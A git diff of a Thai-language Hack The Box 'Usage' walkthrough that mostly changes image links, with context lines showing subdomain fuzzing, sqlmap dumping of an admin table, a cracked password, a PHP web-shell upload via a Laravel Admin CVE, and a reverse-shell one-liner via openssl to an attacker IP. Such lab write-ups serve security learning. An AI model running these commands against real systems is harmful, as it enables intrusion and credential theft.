@@ -33,25 +33,25 @@ wfuzz -u http://usage.htb -H "Host: FUZZ.usage.htb" -w /usr/share/seclists/Disco
 
 ทั้งนี้ใช้ -hh = 178 เนื่องจากต้องการตรวจสอบผลลัพท์ที่มีขนาดตัวอักษรที่ไม่ใช่ 178 
 
-![[Challenge/HTB Challenge/Usage/IMG/001.png]]
+![](./IMG/001.png)
 
 จาพผลลัพธ์จะพบว่ามี admin.usage.htb อยู่ จึงทำการเพิ่มไปที่ไฟล์ /etc/hosts
-![[Challenge/HTB Challenge/Usage/IMG/002.png]]
+![](./IMG/002.png)
 
-![[Challenge/HTB Challenge/Usage/IMG/003.png]]
+![](./IMG/003.png)
 
 หากทดสอบ register จะพบว่าเราสามารถเข้ามาใน Dashboard ของระบบได้ 
 
-![[Challenge/HTB Challenge/Usage/IMG/004.png]]
+![](./IMG/004.png)
 
 หากสืบค้นเพิ่มเติมจะพบหน้าของ /index ซึ่งใช้ Laravel ซึ่งมีการแสดงผลเป็น 404| Not Found ดังภาพ 
-![[Challenge/HTB Challenge/Usage/IMG/005.png]]
+![](./IMG/005.png)
 
 ซึ่งหากเราทำการค้นหาใน Google Image จะพบว่าเป็นหน้า Error Page ของ Laravel จริง 
-![[Challenge/HTB Challenge/Usage/IMG/006.png]]
+![](./IMG/006.png)
 
 หากเราตรวจสอบไปใน Tech Stack จะพบว่า Laravel มีการใช้ cookie 
-![[Challenge/HTB Challenge/Usage/IMG/007.png]]
+![](./IMG/007.png)
 
 1. **XSRF-TOKEN**
 - เป็น token ที่ Laravel สร้างขึ้นเพื่อช่วยป้องกัน **CSRF (Cross-Site Request Forgery)**
@@ -80,12 +80,12 @@ wfuzz -u http://usage.htb -H "Host: FUZZ.usage.htb" -w /usr/share/seclists/Disco
 # SQL injection
 
 หากเราทดสอบว่าสามารถทำ sql injection ได้หรือไม่เราสามารถใส่ Single Qoude ได้ โดยพบว่า server ตอบกลับมาเป็น error นั่นหมายความว่าระบบมีโอกาศจะมีช่องโหว่ SQLi 
-![[Challenge/HTB Challenge/Usage/IMG/008.png]]
+![](./IMG/008.png)
 
-![[Challenge/HTB Challenge/Usage/IMG/009.png]]
+![](./IMG/009.png)
 ทดสอบแก้ไข payload จะพบว่าเราสามารถทำ SQLi ได้ 
 
-![[Challenge/HTB Challenge/Usage/IMG/010.png]]
+![](./IMG/010.png)
 
 เราจะเก็บข้อมูลของ POST Request ของหน้าดังกล่าวและโจมตีไปที่ parameter email ทั้งนี้หากใช้ mode ปกติของ sqlmap จะไม่สามารถใช้ได้ จึงต้องเพิ่ม parameter สำหรับโจมตีดังต่อไปนี้ 
 
@@ -105,7 +105,7 @@ sqlmap -r post.request --level 5 --risk 3 --threads 10 -p email --batch
 | `--threads 10`    | ใช้ 10 threads ในการโจมตีพร้อมกัน เพื่อเพิ่มความเร็ว                                  |
 | `-p email`        | ระบุว่าต้องการตรวจสอบเฉพาะ parameter ที่ชื่อ `email`                                  |
 | `--batch`         | ใช้ค่า default ทั้งหมดโดยไม่รอให้ผู้ใช้ตอบคำถามระหว่างทำงาน                           |
-![[Challenge/HTB Challenge/Usage/IMG/011.png]]
+![](./IMG/011.png)
 ข้อมูลข้างต้นทำให้ทราบได้ว่าเป็นฐานข้อมูลชนิด MySQL  และต่อมาตรวจสอบ DBS 
 ## Enum DBS name 
 
@@ -114,7 +114,7 @@ sqlmap -r post.request --level 5 --risk 3 --threads 10 -p email --batch --dbs
 ```
 
 จากภาพด้านล่างทำให้เห็นว่ามี database ชื่อ usage_blog อยู่ 
-![[Challenge/HTB Challenge/Usage/IMG/012.png]]
+![](./IMG/012.png)
 
 ## Enum Tables usage_blog 
 
@@ -122,7 +122,7 @@ sqlmap -r post.request --level 5 --risk 3 --threads 10 -p email --batch --dbs
 sqlmap -r post.request --level 5 --risk 3 --threads 10 -p email --batch -D usage_blog --tables
 ```
 
-![[Challenge/HTB Challenge/Usage/IMG/013.png]]
+![](./IMG/013.png)
 
 ## Dump admin
 
@@ -133,7 +133,7 @@ sqlmap -r post.request --level 5 --risk 3 --threads 10 -p email --batch -D usage
 
 ```
 
-![[Challenge/HTB Challenge/Usage/IMG/014.png]]
+![](./IMG/014.png)
 
 
 # Crack Hash
@@ -186,7 +186,7 @@ admin:whatever1
 
 หน้าดังกล่าวเป็นหน้าของ Laravel Admin version 1.8.17 
 
-![[Challenge/HTB Challenge/Usage/IMG/015.png]]
+![](./IMG/015.png)
 
 จากข้อมูลข้างต้นทำให้ทราบได้ว่าเวอร์ชันดังกล่าวมีช่องโหว่ [CVE-2023-24249](https://security.snyk.io/vuln/SNYK-PHP-ENCORELARAVELADMIN-3333096)  
 
@@ -196,11 +196,11 @@ admin:whatever1
 ```
 จากนั้นทำการ intercep แล้วเปลี่ยน filename เป็น ice.php 
 
-![[Challenge/HTB Challenge/Usage/IMG/017.png]]
+![](./IMG/017.png)
 ซึ่งจะสามารถ upload ได้ 
-![[Challenge/HTB Challenge/Usage/IMG/016.png]]
+![](./IMG/016.png)
 
-![[Challenge/HTB Challenge/Usage/IMG/018.png]]
+![](./IMG/018.png)
 
 # Shell as dash 
 
@@ -208,14 +208,14 @@ admin:whatever1
 http://admin.usage.htb/uploads/images/ice.php?cmd=mkfifo%20%2Ftmp%2Fs%3B%20%2Fbin%2Fsh%20-i%20%3C%20%2Ftmp%2Fs%202%3E%261%20|%20openssl%20s_client%20-quiet%20-connect%2010.10.14.34%3A443%20%3E%20%2Ftmp%2Fs%3B%20rm%20%2Ftmp%2Fs
 ```
 
-![[Challenge/HTB Challenge/Usage/IMG/019.png]]
+![](./IMG/019.png)
 
 
 # Shell as xander
 
 หากสำรวจใน home ของ dash จะพบว่ามีไฟล์ .monit อยู่จำนวนมาก​ซึ่งหากหาข้อมูลเพิ่มเติมจะพบว่าเป็น **Monit** ซึ่งเป็นเครื่องมือระบบสำหรับการจัดการและตรวจสอบ (monitor) เครื่อง Unix/Linux โดยเฉพาะ 
 
-![[Challenge/HTB Challenge/Usage/IMG/020.png]]
+![](./IMG/020.png)
 
 ```bash
 dash@usage:~$ cat .monitrc
@@ -403,7 +403,7 @@ sudo usage_management
 ```
 
 
-![[Challenge/HTB Challenge/Usage/IMG/021.png]]
+![](./IMG/021.png)
 
 
 ```id_rsa
